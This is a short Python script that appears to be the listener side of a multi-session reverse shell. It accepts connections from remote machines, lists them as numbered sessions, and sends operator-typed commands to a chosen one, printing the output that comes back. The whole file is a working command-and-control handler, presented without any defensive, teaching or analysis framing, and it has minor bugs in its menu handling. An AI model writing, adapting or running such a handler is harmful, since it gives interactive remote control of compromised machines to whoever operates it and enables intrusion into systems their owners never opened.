import  socket
import os
import threading


HOST = "192.168.30.52"
PORT = 6565
client_list = []
address_list = []


def connection(client):
    command = ''
    while command != "close":
        pwd = client.recv(1024).decode('utf-8')+"->"
        while True:
            command = input(pwd)
            if command == "clear" or command == "cls":
                os.system('cls' if os.name == 'nt' else 'clear')
            elif command != "":
                break
        client.send(command.encode('utf-8'))
        print(f"{client.recv(1024).decode('utf-8')}")

       
       
       
def client_connected(server):
    while True:
        sam_client, sam_address = server.accept()
        client_list.append(sam_client)
        address_list.append(sam_address)



server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((HOST,PORT))
server.listen(10)
print(f"[*] Listening on {HOST}:{PORT}\n")

client_collector = threading.Thread(target=client_connected,args=(server,))
client_collector.start()

while True:
    want = input("Connection List: list\nConnect to session: Connect <session number> \n=====>")
    if want.split()[0] == "Connect":
        connection(client_list[int(want.split(" ")[1])-1])
    elif want == "List":
        print(address_list)    
    



